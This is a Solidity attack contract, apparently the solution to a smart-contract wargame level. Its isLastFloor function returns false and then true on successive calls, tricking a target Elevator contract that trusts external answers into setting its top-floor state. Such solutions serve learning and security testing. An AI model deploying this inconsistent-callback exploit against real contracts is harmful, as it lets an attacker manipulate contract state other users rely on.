pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

interface IBuilding {
    function isLastFloor(uint256 _floor) external returns (bool);
}

contract AttackBuilding is IBuilding {
    address public elevator;
    bool private called;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (called) {
            called = false;
            return true;
        } else {
            called = true;
            return false;
        }
    }

    function exploit() external {
        IElevator(elevator).goTo(123);
    }
}
